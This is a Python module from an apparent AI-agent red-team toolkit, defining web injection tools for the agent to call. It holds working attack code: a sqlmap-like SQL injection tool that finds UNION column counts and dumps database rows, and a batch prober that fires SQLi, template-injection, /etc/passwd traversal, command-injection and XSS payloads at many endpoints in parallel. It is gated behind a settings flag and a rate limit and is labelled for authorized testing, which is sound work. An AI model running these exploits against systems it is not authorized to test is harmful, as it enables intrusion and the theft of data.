# SPDX-License-Identifier: AGPL-3.0-only
"""Injection probes for authorized tests: SQL injection, batch probe sets, and the
general injection probe, judged by database error signatures.

Moved out of bridge.py unchanged; bridge.py re-exports every name here.
"""
from __future__ import annotations

import random
import re
import urllib.error
import urllib.parse
import urllib.request
from accuretta.core.settings import get_settings
from accuretta.redteam.governor import _rt_gov_preflight
from accuretta.redteam.http_audit import _recon_prep_url
from accuretta.redteam.recon_fetch import _recon_fetch
from accuretta.redteam.recon_map import _split_sql_select_list
from accuretta.redteam.waf import _hget
from concurrent.futures import ThreadPoolExecutor


_RECON_SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "you have an error in your sql",
    "warning: mysql", "unclosed quotation mark", "quoted string not properly terminated",
    "ora-0", "oracle error", "postgresql", "pg_query", "sqlite",
    "sqlstate", "odbc", "microsoft ole db", "syntax error at or near",
]


def tool_recon_injection_probe(args: dict) -> dict:
    """AUTHORIZED RECON. Non-destructive injection detection on URL query
    parameters: reflected XSS (marker reflected unencoded) and error-based SQLi
    (SQL error signatures after a quote). Sends benign probes only."""
    url = (args.get("url") or args.get("target") or "").strip()
    if not url:
        return {"error": "url required"}
    url = _recon_prep_url(url)
    parsed = urllib.parse.urlparse(url)
    qs = dict(urllib.parse.parse_qsl(parsed.query))
    names = args.get("params") or list(qs.keys())
    if not names:
        return {"error": "no query parameters to test — provide `params` or a URL with ?key=value",
                "hint": "e.g. https://site/search?q=test"}
    timeout = max(2.0, min(float(args.get("timeout") or 8.0), 15.0))
    marker = "acc" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(6))
    xss_payload = f"{marker}<svg/onload=1>"
    findings = []
    # Which checks to run. Default battery keeps the pre-existing behavior; a
    # `checks` list narrows/extends it. All benign, in-band (one request each).
    _valid = {"xss", "sqli", "ssti", "path_traversal", "open_redirect", "crlf"}
    _alias = {"lfi": "path_traversal", "traversal": "path_traversal", "redirect": "open_redirect",
              "open-redirect": "open_redirect", "sql": "sqli", "template": "ssti"}
    _req = args.get("checks")
    if isinstance(_req, str):
        _req = [_req]
    if _req:
        checks = {_alias.get(str(c).lower().strip(), str(c).lower().strip()) for c in _req} & _valid
    else:
        checks = set()
    if not checks:
        checks = {"xss", "sqli", "ssti", "path_traversal"}

    def build(param, value):
        newqs = dict(qs)
        newqs[param] = value
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(newqs)))

    for param in names:
        if "xss" in checks:
            r = _recon_fetch(build(param, xss_payload), timeout=timeout, max_bytes=20000)
            if "body" in r and xss_payload in r["body"]:
                findings.append({"param": param, "type": "reflected XSS",
                                 "severity": "high", "evidence": "payload reflected unencoded"})
            elif "body" in r and marker in r["body"]:
                findings.append({"param": param, "type": "reflection (encoded)",
                                 "severity": "info", "evidence": "marker reflected but encoded/sanitized"})
        if "sqli" in checks:
            r2 = _recon_fetch(build(param, "'\""), timeout=timeout, max_bytes=20000)
            body_l = (r2.get("body") or "").lower()
            hit = next((sig for sig in _RECON_SQL_ERRORS if sig in body_l), None)
            if hit:
                findings.append({"param": param, "type": "error-based SQLi",
                                 "severity": "high", "evidence": f"SQL error signature: '{hit}'"})
        if "ssti" in checks:
            # A distinctive arithmetic marker (1337*1337 = 1787569) that only
            # appears if the value is evaluated as a template. Require the RESULT
            # present and the raw expression absent.
            for probe_val, engine in (("{{1337*1337}}", "jinja/twig"),
                                      ("${1337*1337}", "el/freemarker/spel"),
                                      ("<%= 1337*1337 %>", "erb/ejs")):
                rs = _recon_fetch(build(param, probe_val), timeout=timeout, max_bytes=20000)
                rb = rs.get("body") or ""
                if "1787569" in rb and probe_val not in rb:
                    findings.append({"param": param, "type": "server-side template injection (SSTI)",
                                     "severity": "critical",
                                     "evidence": f"{probe_val} evaluated to 1787569 ({engine})"})
                    break
        if "path_traversal" in checks:
            rl = _recon_fetch(build(param, "../../../../../../etc/passwd"), timeout=timeout, max_bytes=20000)
            if re.search(r"root:.*:0:0:", rl.get("body") or ""):
                findings.append({"param": param, "type": "path traversal / LFI",
                                 "severity": "high", "evidence": "/etc/passwd contents returned"})
        if "open_redirect" in checks:
            # Inject an absolute URL to a benign marker host; a vulnerable app
            # 30x's to it (Location) or drops it into a client-side redirect.
            om = "https://accuretta-redir.example/oob"
            rr = _recon_fetch(build(param, om), timeout=timeout, max_bytes=4000, follow=False)
            loc = _hget(rr.get("headers", {}), "location")
            if rr.get("status") in (301, 302, 303, 307, 308) and loc.startswith("https://accuretta-redir.example"):
                findings.append({"param": param, "type": "open redirect",
                                 "severity": "medium", "evidence": f"Location redirect to injected URL: {loc[:80]}"})
            elif om in (rr.get("body") or "") and re.search(r"(meta[^>]+refresh|location\s*=)", (rr.get("body") or "").lower()):
                findings.append({"param": param, "type": "open redirect (client-side)",
                                 "severity": "low", "evidence": "injected URL reflected into a client-side redirect"})
        if "crlf" in checks:
            # Smuggle a header via CRLF; if the app reflects it into the response
            # header set, header injection / response splitting is possible.
            cr = _recon_fetch(build(param, "\r\nX-Acc-Inj: " + marker), timeout=timeout, max_bytes=1000, follow=False)
            if _hget(cr.get("headers", {}), "x-acc-inj"):
                findings.append({"param": param, "type": "CRLF header injection",
                                 "severity": "high", "evidence": "injected X-Acc-Inj header appeared in the response"})

    return {"url": url, "checks": sorted(checks), "tested_params": names,
            "finding_count": len(findings),
            "findings": findings or [{"type": "none", "severity": "info",
                                       "note": "no injection signatures observed for the selected checks"}]}


def tool_sql_injection(args: dict) -> dict:
    """AUTHORIZED PENTEST. Semi-automated SQL injection on a GET query parameter
    (sqlmap-lite). Handles the mechanical parts so the model only decides WHAT to
    pull: probes error-based + boolean-based injectability, finds the UNION
    column count automatically, and — if `extract` is given (a SELECT list,
    optionally with FROM, e.g. "flag FROM secrets" or "name FROM sqlite_master
    WHERE type='table'") — builds the padded UNION payload and returns the rows.
    Pass `url` (with the target param) and optionally `param` (defaults to the
    first query param). Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    url = _recon_prep_url((args.get("url") or args.get("target") or "").strip())
    if not url or "?" not in url:
        return {"error": "url with a query parameter required, e.g. http://host/search?q=test"}
    timeout = max(2.0, min(float(args.get("timeout") or 8.0), 15.0))
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not qs:
        return {"error": "no query parameter to inject"}
    param = args.get("param") or qs[0][0]
    base_val = dict(qs).get(param, "1")

    def send(injection):
        newqs = [(k, (injection if k == param else v)) for k, v in qs]
        u = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(newqs)))
        return _recon_fetch(u, timeout=timeout, max_bytes=20000)

    def looks_error(body):
        bl = (body or "").lower()
        return ("sql error" in bl or "syntax error" in bl or
                "do not have the same number" in bl or
                any(sig in bl for sig in _RECON_SQL_ERRORS))

    result = {"url": url, "param": param}
    # injectability: error-based + boolean-based
    result["error_based"] = looks_error(send(base_val + "'").get("body"))
    t = send(base_val + "' AND '1'='1")
    f = send(base_val + "' AND '1'='2")
    result["boolean_based"] = ((t.get("body") or "") != (f.get("body") or "")
                               and t.get("status") == f.get("status"))
    result["injectable"] = result["error_based"] or result["boolean_based"]

    # UNION column count: pad until the response is a clean, non-error 200. NULL
    # first; then numbers, for pages that format a column (a NULL price breaks
    # "{:.2f}" and reads as a failed probe).
    def filler(n, kind):
        return ",".join(["NULL"] * n if kind == "null" else [str(i + 1) for i in range(n)])

    ncols, fill = None, "null"
    for n in range(1, 13):
        for kind in ("null", "num"):
            r = send(base_val + "' UNION SELECT " + filler(n, kind) + "-- ")
            if r.get("status") == 200 and not looks_error(r.get("body")):
                ncols, fill = n, kind
                break
        if ncols:
            break
    result["union_columns"] = ncols

    # Which columns the page shows: a marker string in one column at a time
    # (a column the page formats as a number fails, and isn't one to read from).
    reflected = []
    if ncols:
        base_cols = filler(ncols, fill).split(",")
        for i in range(ncols):
            marker = f"accq{i + 1}z"
            cols = list(base_cols)
            cols[i] = f"'{marker}'"
            r = send(base_val + "' UNION SELECT " + ",".join(cols) + "-- ")
            if r.get("status") == 200 and marker in (r.get("body") or ""):
                reflected.append(i)
    result["reflected_columns"] = [i + 1 for i in reflected]

    extract = (args.get("extract") or "").strip()
    if extract:
        if ncols is None:
            result["note"] = ("couldn't fix UNION column count — extract manually via http_request "
                              "(boolean/blind), or check the parameter is really UNION-injectable.")
            return result
        m = re.split(r"\s+from\s+", extract, maxsplit=1, flags=re.IGNORECASE)
        select_part = m[0].strip()
        from_part = (" FROM " + m[1].strip()) if len(m) > 1 else ""
        exprs = _split_sql_select_list(select_part)
        cols = filler(ncols, fill).split(",")
        joined = False
        if reflected:
            if len(exprs) > len(reflected):
                # More values than shown columns: one string per row, '~' between values.
                exprs = ["||'~'||".join(f"COALESCE(CAST({e} AS TEXT),'')" for e in exprs)]
                joined = True
            for pos, expr in zip(reflected, exprs):
                cols[pos] = expr
        else:
            for pos, expr in enumerate(exprs[:ncols]):
                cols[pos] = expr
        payload = base_val + f"' UNION SELECT {','.join(cols)}{from_part}-- "
        r = send(payload)
        note = ("extracted rows are in dump_body — the injected values are the ones "
                "absent from a normal query's results.")
        if joined:
            note += (" Several values were joined into one column with '~' (SQLite/PostgreSQL "
                     "syntax; on MySQL pass them one at a time or use CONCAT_WS).")
        if not reflected:
            note += (" No column's value shows on the page, so the values may not be visible: "
                     "use boolean/blind extraction with http_request if dump_body lacks them.")
        result.update({"payload": payload, "dump_status": r.get("status"),
                       "dump_body": r.get("body", ""), "note": note})
    else:
        result["note"] = ("injectable — pass `extract` (e.g. 'flag FROM secrets', or enumerate schema "
                          "with 'name FROM sqlite_master') to dump."
                          if result["injectable"] else "no clear injection on this parameter.")
    return result


# Built-in payload sets per vuln class for batch_probe. Distinctive markers so a
# hit means execution/read, not mere reflection (e.g. 31337*2 = 62674).
_BATCH_PROBE_SETS = {
    "sqli": ["'", "1' OR '1'='1", "1\" OR \"1\"=\"1"],
    "ssti": ["{{1337*1337}}", "${1337*1337}", "<%= 1337*1337 %>"],
    "lfi":  ["../../../../../../etc/passwd", "....//....//....//etc/passwd"],
    "cmdi": [";echo $((31337*2))", "|echo $((31337*2))", "`echo $((31337*2))`"],
    "xss":  ["<svg/onload=1>"],
}


def tool_batch_probe(args: dict) -> dict:
    """AUTHORIZED PENTEST. Fire a payload set at EVERY parameter of MANY endpoints
    in one call — the "try this against every parameterized endpoint" primitive,
    so you don't hand-craft N×M http_request calls. Give `targets` (a list of URLs
    that carry query params) and either `probe` (a built-in class: sqli | ssti |
    lfi | cmdi | xss) or your own `payloads` list. For each target × param ×
    payload it sends the request and flags hits (SQL error / template-eval /
    /etc/passwd read / shell-exec / reflection signatures — or, for custom
    payloads, responses that differ from the parameter's baseline). Follow a hit
    up with sql_injection (dump), http_request (exploit), or fuzz (enumerate).
    Read-only per request. Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    targets = args.get("targets") or args.get("urls") or args.get("url")
    if isinstance(targets, str):
        targets = [targets]
    if not targets:
        return {"error": "provide `targets` — a list of URLs that carry query parameters"}
    probe = (args.get("probe") or "").lower().strip()
    payloads = args.get("payloads")
    if isinstance(payloads, str):
        payloads = [payloads]
    if not payloads:
        if probe not in _BATCH_PROBE_SETS:
            return {"error": "provide `probe` (sqli|ssti|lfi|cmdi|xss) or a `payloads` list"}
        payloads = _BATCH_PROBE_SETS[probe]
    timeout = max(2.0, min(float(args.get("timeout") or 6.0), 12.0))

    def detect(body):
        b = body or ""
        bl = b.lower()
        if probe == "sqli":
            # Match the same signatures sql_injection uses, incl. the generic
            # "sql error" / "syntax error" prefixes many apps emit.
            for sig in ("sql error", "syntax error", "unrecognized token",
                        "do not have the same number", *_RECON_SQL_ERRORS):
                if sig in bl:
                    return f"SQL error signature: '{sig}'"
            return None
        if probe == "ssti":
            return "template evaluated (1787569)" if "1787569" in b else None
        if probe == "lfi":
            if re.search(r"root:.*:0:0:", b):
                return "/etc/passwd contents returned"
            return "win.ini returned" if "[fonts]" in bl else None
        if probe == "cmdi":
            return "command executed (shell computed 62674)" if "62674" in b else None
        if probe == "xss":
            return "payload reflected unencoded" if "<svg/onload=1>" in b else None
        return None  # custom payloads → handled via baseline diff below

    # Expand to one job per (url, param).
    jobs = []
    for t in targets:
        u = _recon_prep_url(str(t))
        p = urllib.parse.urlparse(u)
        q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
        for pname, _ in q:
            jobs.append((u, p, q, pname))
    if not jobs:
        return {"error": "no query parameters found in targets — include a ?key=value in each URL"}

    _gov = _rt_gov_preflight(len(jobs) * len(payloads))
    if _gov:
        return {"error": _gov, "rate_limited": True,
                "targets": len(targets), "params_tested": len(jobs)}

    cap = 400  # hard ceiling on total requests
    counter = {"sent": 0}

    def run(job):
        u, p, q, pname = job
        base = None
        if not probe:  # custom payloads: reference the unmodified response
            r0 = _recon_fetch(u, timeout=timeout, max_bytes=6000)
            base = (r0.get("status"), len(r0.get("body") or ""))
        out = []
        for pay in payloads:
            if counter["sent"] >= cap:
                break
            counter["sent"] += 1
            newq = [(k, (pay if k == pname else v)) for k, v in q]
            uu = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(newq)))
            r = _recon_fetch(uu, timeout=timeout, max_bytes=20000)
            body = r.get("body", "")
            ev = detect(body)
            if ev is None and not probe:
                if (r.get("status"), len(body or "")) != base:
                    ev = f"response changed (status {r.get('status')}, {len(body or '')}b vs baseline {base})"
            if ev:
                out.append({"path": p.path, "param": pname, "payload": pay,
                            "status": r.get("status"), "evidence": ev, "test_url": uu})
        return out

    hits = []
    with ThreadPoolExecutor(max_workers=6, thread_name_prefix="batch") as ex:
        for res in ex.map(run, jobs):
            hits.extend(res)

    return {"targets": len(targets), "params_tested": len(jobs), "requests_sent": counter["sent"],
            "probe": probe or "custom", "hit_count": len(hits), "hits": hits,
            "note": ("injectable/interesting endpoints are in hits — follow up with sql_injection "
                     "(dump), http_request (exploit), or fuzz (enumerate).") if hits else
                    "no signatures fired for this payload set across the given endpoints."}
